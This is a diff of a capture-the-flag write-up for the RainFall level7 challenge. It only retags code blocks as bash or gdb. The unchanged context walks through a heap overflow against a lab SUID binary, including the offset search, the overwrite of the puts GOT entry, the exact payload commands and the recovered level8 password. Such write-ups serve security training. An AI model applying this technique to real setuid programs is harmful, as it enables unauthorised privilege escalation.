@@ -8,7 +8,7 @@ In this level, we exploit a heap-based buffer overflow to overwrite a function p
 
 Before diving into the exploitation, let's identify the current user context:
 
-```
+```bash
 level7@RainFall:~$ id
 uid=2024(level7) gid=2024(level7) groups=2024(level7),100(users)
 ```
@@ -17,7 +17,7 @@ uid=2024(level7) gid=2024(level7) groups=2024(level7),100(users)
 
 Let's inspect the current directory:
 
-```
+```bash
 level7@RainFall:~$ ll
 -rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7*
 ```
@@ -30,7 +30,7 @@ We have a SUID binary owned by level8. Our goal is to exploit this binary to rea
 
 Let’s test how the binary reacts to different inputs. This gives us a hint about its internal logic:
 
-```
+```bash
 level7@RainFall:~$ ./level7
 Segmentation fault (core dumped)
 level7@RainFall:~$ ./level7 hello
@@ -137,14 +137,14 @@ We'll take a simple and intuitive approach using `ltrace` combined with Metasplo
 
 First, generate a unique pattern:
 
-```
+```bash
 ~/RainFall/level7 main > msf-pattern_create -l 100
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 ```
 
 Then, run the binary using `ltrace`:
 
-```
+```bash
 level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 __libc_start_main(0x8048521, 2, 0xbffff794, 0x8048610, 0x8048680 <unfinished ...>
 malloc(8)                                                   = 0x0804a008
@@ -165,7 +165,7 @@ Here’s what happens:
 
 This address is part of our pattern. Let’s now use Metasploit to determine the corresponding offset:
 
-```
+```bash
 ~/RainFall/level7 main > msf-pattern_offset -q 0x37614136
 [*] Exact match at offset 20
 ```
@@ -198,7 +198,7 @@ To redirect execution to the `m()` function, we’ll overwrite the **GOT entry o
 
 First, disassemble `puts@plt` in GDB:
 
-```
+```gdb
 (gdb) disas puts
 Dump of assembler code for function puts@plt:
    0x08048400 <+0>:     jmp    *0x8049928
@@ -228,7 +228,7 @@ Next, we’ll find the exact address of `m()` so we can complete the exploit pay
 
 To redirect execution properly, we need the actual address of the `m()` function. Use GDB to list the functions and inspect `m`:
 
-```
+```gdb
 (gdb) info functions
 ...
 0x080484f4 m
@@ -237,7 +237,7 @@ To redirect execution properly, we need the actual address of the `m()` function
 
 So the address of `m()` is:
 
-```
+```gdb
 0x080484f4
 ```
 
@@ -258,14 +258,14 @@ We’ll construct two arguments:
 
 Here’s how you do it in Bash using `python -c` for each argument:
 
-```
+```bash
 export A=$(python -c 'print("A" * 20 + "\x28\x99\x04\x08")')
 export B=$(python -c 'print("\xf4\x84\x04\x08")')
 ```
 
 Then run the exploit:
 
-```
+```bash
 ./level7 "$A" "$B"
 ```
 
@@ -273,7 +273,7 @@ Then run the exploit:
 
 You should now see the password:
 
-```
+```bash
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1754404610
 ```
